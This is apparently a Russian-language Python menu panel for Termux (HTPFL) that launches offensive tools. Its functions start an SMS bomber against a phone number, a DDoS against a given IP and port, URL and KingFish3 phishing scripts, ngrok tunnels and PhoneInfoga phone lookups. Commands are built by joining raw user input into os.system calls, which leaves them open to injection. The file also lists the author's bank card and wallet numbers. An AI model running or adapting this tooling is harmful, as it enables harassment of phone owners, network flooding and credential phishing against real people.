# Импортирование модулей
from termcolor import colored
import os
import sys
from time import sleep
from random import choice, randint
import requests

os.system("clear")

# Проверка сети
def ICC():
    try:
        requests.get("https://google.com", timeout=4)
    except:
        print(colored("[!]", "red"), colored("Ваше устройство не подключено к интернету", "magenta"))
        jshx = colored("С уважением HTPFL", "magenta")
        jshx2 = colored("[✓]", "green")
        print(jshx2, jshx)
        print("")
        sys.exit(1)
        
        
print(colored("Проверка сети...", "green"))
print("")
sleep(1)
ICC()
        


# Баннер
def Banner():
    os.system("clear")
    color = ["red", "blue", "yellow", "green", "cyan", "magenta"]
    color2 = choice(color)
    Banner = '''
  _    _ _______ _____  ______ _
 | |  | |__   __|  __ \|  ____| |
 | |__| |  | |  | |__) | |__  | |
 |  __  |  | |  |  ___/|  __| | |
 | |  | |  | |  | |    | |    | |____
 |_|  |_|  |_|  |_|    |_|    |______|
     '''
    print(colored(Banner, color2))
    # ---
    color3 = choice(color)
    color4 = choice(color)
    color5 = choice(color)
    color6 = choice(color)
    color7 = choice(color)
    color8 = choice(color)
    color9 = choice(color)
    color10 = choice(color)
    color11 = choice(color)

    A1 = colored("S", color3)
    A2 = colored("m", color4)
    A3 = colored("s", color5)
    A4 = colored("B", color6)
    A5 = colored("o", color7)
    A6 = colored("m", color8)
    A7 = colored("b", color9)
    A8 = colored("e", color10)
    A9 = colored("r", color11)

    ist = (colored("[1]", "red"))
    print(ist, A1 + A2 + A3, A4 + A5 + A6 + A7 + A8 + A9)
    fah = (colored("[2]", "red"))
    fah2 = (colored("VPN For Termux", "blue"))
    print(fah, fah2)
    psh = colored("[3]", "red")
    psh2 = colored("DDOS", "magenta")
    psh3 = colored("For Wi-Fi", "cyan")
    print(psh, psh2, psh3)
    url = colored("[4]", "red")
    url2 = colored("UrlPhish", "yellow")
    print(url, url2)
    ngr = colored("[5]", "red")
    ngr2 = colored("ngrok", "green")
    print(ngr, ngr2)
    kfg3 = colored("[6]", "red")
    kfg32 = colored("KingFish3", "blue")
    print(kfg3, kfg32)
    phi = colored("[7]", "red")
    phi2 = colored("PhoneInfoga", "yellow")
    print(phi, phi2)
    print("")
    ksy = colored("[99]", "red")
    ksy2 = colored("О Программе", "cyan")
    print(ksy, ksy2)
    print("")
    print("")
    upd = colored("[Act]", "red")
    upd2 = colored("Действия Панели", "green")
    podd = colored("[Sup]", "red")
    podd2 = colored("Поддержать автора", "magenta")
    podd3 = colored("      <<———", color10)
    print(podd, podd2, podd3)
    print(upd, upd2)
    istD = (colored("[0]", "red"))
    istD2 = (colored("Выход", "red"))
    print(istD, istD2)
    print("")


Banner()


# Списки
by = ["Всего доброго!", "Досвидания!", "Удачи!", "Пока!", "До встречи!"]
by2 = choice(by)

# Переменный для ядра
grf = (colored("[1]", "cyan"))
grf2 = (colored("[2]", "cyan"))
grf3 = (colored("download", "yellow"))
grf4 = (colored("start", "green"))
hsg = (colored("Назад", "red"))


#Функции
def osnova():
    while True:
        about()


def Bomb():
	antispam = ["79615544631","89615544631" "89502135308", "79503366421", "89503366421", "79195077929", "89195077929"]
	print("")
	print(colored("⟨Starting Bombers⟩", "blue"))
	imp = colored("[1]", "cyan")
	start = colored("Start", "green")
	imp3 = colored("Īmpūlse", "magenta")
	# —
	bom = colored("[2]", "cyan")
	bom2 = colored("b0mb3r", "red")
	print(imp, start, imp3)
	print(bom, start, bom2)
	print("")
	print(colored("⟨Download Modules and Bomber⟩", "blue"))
	dow = colored("[3]", "cyan")
	dow2 = colored("[4]", "cyan")
	dow3 = colored("Download modules for ", "yellow")
	dow4 = colored("Download", "yellow")
	print(dow, dow3 + imp3)
	print(dow2, dow4, bom2)
	print("")
	print("")
	print(colored("[0] Назад", "red"))
	print("")
	bomber = input(colored(" —>> ", "red"))
	if bomber == "1":
		print("")
		numberr = colored("Phone: ", "red")
		number = input(colored(numberr + "+"))
		if number in antispam:
			print("")
			print(colored("Нельзя запустить спам на данный номер", "red"))
			sys.exit(0)
		print("")
		easy = colored("Easy", "green")
		normal = colored("Normal", "yellow")
		fast = colored("Fast", "magenta")
		veryfast = colored("Very Fast", "red")
		print(imp, easy)
		print(bom, normal)
		print(dow, fast)
		print(dow2, veryfast)
		print("")
		threads = input(colored("Режим: ", "blue"))
		if threads == "1":
			threads = "50"
		elif threads == "2":
			threads = "100"
		elif threads == "3":
			threads = "150"
		elif threads == "4":
			threads = "200"
		else:
			print("")
			threads = colored(threads, "red")
			nesu = colored("Не существует режима под номером ", "red")
			print(nesu + threads)
			sys.exit(0)
		print("")
		time = input(colored("Время: ", "blue"))
		print("")
		os.system("cd % && python impulse.py --target " + number + " --method SMS --time " +time+" --threads "+threads)
	elif bomber == "2":
		print("")
		print(colored("Запуск локального хоста, пожалуйста подождите...", "green"))
		randbomb = ["bomber", "b0mb3r"]
		randbomb = choice(randbomb)
		os.system(randbomb)
	elif bomber == "3":
		print("")
		print(colored("Starting...", "green"))
		os.system("pip install wget")
		os.system("pip install humanfriendly")
	elif bomber == "4":
		print("")
		print(colored("Starting...", "green"))
		os.system("pip install b0mb3r -U")
	elif bomber == "0" or bomber == "Назад":
		while True:
			Banner()
			osnova()
	else:
		print("")
		print(colored("Выбери чтото из вариантов", "red"))




def RVpn():
    print("")
    print(grf, grf3)
    print(grf2, grf4)
    un = (colored("remove", "magenta"))
    un2 = (colored("[3]", "cyan"))
    print(un2, un)
    print("")
    print("")
    jsh = (colored("[0]", "red"))
    print(jsh, hsg)
    print("")
    vpn = input(colored(" —>> ", "red"))
    print("")
    if vpn == "1" or vpn == "download":
        print("")
        print(colored("После первой установки, устанавливать еще раз не нужно", "cyan"))
        print("")
        sleep(3)
        os.system("pkg install tor -y")
        print("")
        print(colored("Complete!", "green"))
        print("")
        sleep(1.1)
        while True:
            RVpn()
    elif vpn == "2" or vpn == "start":
        print("")
        print(colored("Запуск VPN начнётся через 12с после выбора пункта", "green"))
        print("")
        print(colored(
            "Когда на экране у опредленной строки 'Bootstrapped' будет значение 100%, тогда можно будет использовать другие утилиты, обязательно в новой сессии, для того чтобы остановить введите 'Ctrl + C",
            "yellow"))
        print("")
        sleep(12)
        os.system("tor")
    elif vpn == "3" or vpn == "remove":
        sleep(2)
        print("")
        os.system("pkg uninstall tor -y")
        print("")
        print(colored("Deletion Completed!", "green"))
        print("")
        sleep(1.1)
        while True:
            RVpn()
    elif vpn == "0" or vpn == "Назад":
        while True:
            Banner()
            osnova()


def ddos():
    print("")
    ahg4 = colored("[2]", "cyan")
    ahg5 = colored("start", "green")
    ahg6 = colored("[0] Назад", "red")
    up3 = colored("download modules", "yellow")
    up4 = colored("[1]", "cyan")
    print(up4, up3)
    print(ahg4, ahg5)
    print("")
    print("")
    print(ahg6)
    print("")
    ddosr = input(colored(" —>> ", "red"))
    if ddosr == "1":
        print("")
        print(colored("Starting downloads modules..."))
        print("")
        sleep(1.35)
        os.system("pkg install python2")
        while True:
            ddos()
    elif ddosr == "2":
        ip = input(colored("Шлюз или IP ", "blue"))
        port = input(colored("Открытый Порт ", "blue"))
        print("")
        ctrl = colored('"Ctrl + Z"', "green")
        cht = colored("ЧТОБЫ ОСТАНОВИТЬ ДДОС ИСПОЛЬЗУЙ КОМБИНАЦИЮ", "red")
        print(cht, ctrl)
        print("")
        an = ('5', '4', '3', '2', '1')
        ian = 0
        while True:
            print('start через - ', colored(an[ian % len(an)], 'green'), sep='', end='\r')
            sleep(1)
            ian += 1
            if ian * 0.1 > 0.45: break
        print(colored('Starting!                            ', "green"))
        print("")
        os.system("python2 d.py " + ip + " " + port + " 3000")
    else:
        while True:
            Banner()
            osnova()


def url():
    print("")
    ahg = colored("[1]", "green")
    ahg2 = colored("start", "green")
    ahg3 = colored("[0] Назад", "red")
    print(ahg, ahg2)
    print("")
    print("")
    print(ahg3)
    print("")
    bro = input(colored(" —>> ", "red"))
    if bro == "1" or bro == "start":
        os.system("clear && python3 u.py")
        sleep(1)
        while True:
            print("")
            Banner()
            ll2 = colored(" —>>", "red")
            lll2 = colored("6", "white")
            print(ll2, lll2)
            url()
    else:
        while True:
            Banner()
            osnova()


def ngrok():
    print("")
    qo = colored("[1]", "cyan")
    qo2 = colored("[2]", "cyan")
    wo = colored("Активировать ngrok", "yellow")
    wo2 = colored("start", "green")
    print(qo, wo)
    print(qo2, wo2)
    print("")
    print("")
    nz6 = colored("[0]", "red")
    nz5 = colored("Назад", "red")
    print(nz6, nz5)
    print("")
    ngrokr = input(colored(" —>> ", "red"))
    if ngrokr == "1" or ngrok == "Активировать ngrok":
        os.system("chmod +x ngrok")
        print("")
        token = input(colored("Введите ваш Токен ", "blue"))
        os.system("./ngrok authtoken " + token)
        print("")
        akt = colored("Токен активирован! Если при запуске ngrok у вас будет постоянный", "magenta")
        akt2 = colored("то включите мобильную точку доступа", "magenta")
        akt3 = colored("reconnecting", "red")
        print(akt, akt3, akt2)
        print("")
        print("Вы будете перенаправлены на главную панель через 10 секунд")
        sleep(10)
    elif ngrokr == "2" or ngrok == "start":
        print("")
        locport = input(colored("Укажите порт ", "blue"))
        print("")
        os.system("./ngrok http " + locport)
    else:
        while True:
            Banner()
            osnova()

def Sup():
    print("")
    qiwi = colored("QIWI Wallet", "yellow")
    sber = colored("Сбербанк", "green")
    yan = colored("YandexMoney", "yellow")
    v1 = colored("[1]", "cyan")
    v2 = colored("[2]", "cyan")
    v3 = colored("[3]", "cyan")
    quu = colored("[0] Назад", "red")
    print(v1, qiwi)
    print(v2, sber)
    print(v3, yan)
    print("")
    print("")
    print(quu)
    print("")
    varik = input(colored(" —>> ", "red"))
    if varik == "1" or varik == "QIWI Wallet":
        print("")
        qiwi2 = colored("Карта Киви - 4890 4946 2492 6044", "yellow")
        print(qiwi2)
        print("")
        print("")
        print(quu)
        print("")
        varik2 = input(colored(" —>> ", "red"))
        if varik2 == "0" or varik2 == "Назад":
            while True:
                Sup()
        else:
            print("")
            print(colored("ДУРНОЙ ДА??", "red"))
            sys.exit(0)
    elif varik == "2" or varik == "Сбербанк":
        print("")
        qiwi3 = colored("Карта Сбербанк - 5469 4500 1265 2996", "yellow")
        print(colored(qiwi3))
        print("")
        print("")
        print(quu)
        print("")
        varik3 = input(colored(" —>> ", "red"))
        if varik3 == "0" or varik3 == "Назад":
            while True:
                Sup()
        else:
            print("")
            print(colored("ДУРНОЙ ДА??", "red"))
            sys.exit(0)
    elif varik == "3" or varik == "YandexMoney":
        print("")
        qiwi4 = colored("Номер Счета ЯндексМани - 4100 1154 8832 2904", "yellow")
        print(colored(qiwi4))
        print("")
        print("")
        print(quu)
        print("")
        varik4 = input(colored(" —>> ", "red"))
        if varik4 == "0" or varik4 == "Назад":
            while True:
                Sup()
        else:
            print("")
            print(colored("ДУРНОЙ ДА??", "red"))
            sys.exit(0)
    elif varik == "0" or varik == "Назад":
    	while True:
    		Banner()
    		osnova()
    else:
        print("")
        print(colored("ДУРНОЙ ДА??", "red"))
        sys.exit(0)


def act():
    print("")
    upds = colored("[1]", "cyan")
    upds2 = colored("Update", "green")
    print(upds, upds2)
    remove2 = colored("[2]", "cyan")
    remove = colored("Remove", "red")
    print(remove2, remove)
    mod2 = colored("[3]", "cyan")
    mod = colored("Update all modules", "yellow")
    print(mod2, mod)
    print("")
    print("")
    nz = colored("[0]", "red")
    nz2 = colored("Назад", "red")
    print(nz, nz2)
    print("")
    actr = input(colored(" —>> ", "red"))
    if actr == "1" or act == "Update":
        print("")
        print(colored("Starting update...", "green"))
        print("")
        sleep(1.45)
        os.system("cd && rm -rf HTPFL && git clone https://github.com/Lucky1376/HTPFL && cd HTPFL && python HTPFL.py")
        sys.exit(0)
        print("")
    elif actr == "2" or act == "Remove":
        print("")
        print(colored("Starting remove...", "magenta"))
        print("")
        sleep(1.45)
        os.system("cd && rm -rf HTPFL")
        sys.exit(0)
        os.system("clear")
        exit()
        print("")
    elif actr == "3" or act == "Update all modules":
        print(colored("Да | Нет", "blue"))
        podtv = input(colored("Обновление всех модулей может занять очень много времени, вы согласны с таким решением? ", "red"))
        if podtv == "Да" or podtv == "да":
            print("")
            print(colored("Starting update all modules", "yellow"))
            print("")
            sleep(1.45)
            os.system(
                "pkg update -y && pkg upgrade -y && pkg update git -y && pkg update python && pip install --upgrade pip && pip install --upgrade colored && pip install --upgrade requests && pip install --upgrade argparse && pip install --upgrade colorama && pip install --upgrade termcolor && pkg update python2 && pip install --upgrade wget && pip install --upgrade humanfriendly && pip install --upgrade b0mb3r && pip install --upgarde multiprocessing && pip install --upgarde prettytable && pip install --upgrade b0mb3r")
            print("")
            print(colored("Complete!", "green"))
            print("")
            print("")
        else:
            while True:
                act()
    else:
        while True:
            Banner()
            osnova()

def kfg():
    print("")
    str10 = colored("[2]", "cyan")
    str11 = colored("start", "green")
    mod = colored("download modules for KingFish3", "yellow")
    mod2 = colored("[1]", "cyan")
    print(mod2, mod)
    print(str10, str11)
    print("")
    print("")
    print(colored("[0] Назад", "red"))
    print("")
    kfgi = input(colored(" —>> ", "red"))
    if kfgi == "2" or kfgi == "start":
        print("")
        os.system("cd kfg3 && python fsh.py")
        sleep(1)
        while True:
            Banner()
            print("")
            ll = colored(" —>>", "red")
            lll = colored("6", "white")
            print(ll, lll)
            kfg()
        print("")
    elif kfgi == "1" or kfgi == "download modules for KingFish3":
        print("")
        os.system("pip3 install prettytable && pkg install php && pip3 install colorama")
        print("")
        print(colored("Complete!", "green"))
        print("")
        print("")
    elif kfgi == "0" or kfgi == "Назад":
        while True:
            Banner()
            osnova()
    else:
        print("")
        print("Ты БОЛЬНОЙ??", "red")
        sleep(1.55)
        while True:
            kfg()
            
def PhoneInfoga():
	print("")
	print(colored("[1]", "cyan"), colored("download modules for PhoneInfoga", "yellow"))
	print(colored("[2]", "cyan"), colored("start", "green"))
	print("")
	print("")
	print(colored("[0] Назад", "red"))
	print("")
	phii = input(colored(" —>> ", "red"))
	if phii == "1":
		os.system("pip install bs4")
		os.system("pip install html5lib")
		os.system("pip install phonenumbers")
		os.system("pip install urllib3")
		print("")
		print(colored("Complete!", "green"))
		print("")
	elif phii == "2":
		print("")
		phonee = input(colored(" Номер +", "red"))
		phonee = ("+"+phonee)
		print("")
		print(colored("Сканирование...", "magenta"))
		sleep(3)
		os.system("python phi.py -n "+phonee)
		print("")
		print(colored("Сканирование завершено!", "green"))
	elif phii == "0":
		while True:
			Banner()
			osnova()
	else:
		print("")
		print(colored("Выберите правильный пункт...", "red"))


def programm():
    print("")
    name = colored("Lucky", "red")
    raz = colored("Разработчик -", "cyan")
    print(raz, name)
    vr = colored("0.9.0", "blue")
    ver = colored("Version -", "cyan")
    print(ver, vr)
    lang = colored("Python", "green")
    lan = colored("Язык -", "cyan")
    print(lan, lang)
    vk = colored("https://m.vk.com/id554311036", "magenta")
    vkp = colored("VK -", "cyan")
    print(vkp, vk)
    tg = colored("https://t.me/Lucky1376", "cyan")
    tgo = colored("Telegram -", "blue")
    print(tgo, tg)
    print("")
    print("")
    jsg = (colored("[0]", "red"))
    print(jsg, hsg)
    print("")
    sled = input(colored(" —>> ", "red"))
    if sled == "0" or sled == "Назад":
        while True:
            Banner()
            osnova()


def about():
    global numb
    numb = (input(colored(" —>> ", "red")))
    if numb == "1" or numb == "Sms Bomber":
        while True:
            Bomb()
    elif numb == "2" or numb == "VPN For Termux":
        while True:
            RVpn()
    elif numb == "3" or numb == "DDOS For Wi-Fi":
        while True:
            ddos()
    elif numb == "4" or numb == "UrlPhish":
        while True:
            url()
    elif numb == "5" or numb == "ngrok":
        while True:
            ngrok()
    elif numb == "6" or numb == "KingFish3":
        while True:
            kfg()
    elif numb == "7" or numb == "PhoneInfoga":
    	while True:
    		PhoneInfoga()
    elif numb == "99" or numb == "О Программе":
        while True:
            programm()
    elif numb == "Sup" or numb == "sup":
        while True:
            Sup()
    elif numb == "act" or numb == "Act" or numb == "Действия Панели":
        while True:
            act()
    elif numb == "0" or numb == "Выход":
        os.system("clear")
        print("")
        print(colored(by2, "green"))
        print("")
        sys.exit(0)
    else:
        os.system("clear")
        print("")
        print(colored("ERROR", "red"))
        print("")
        sys.exit(0)

while True:
    about()
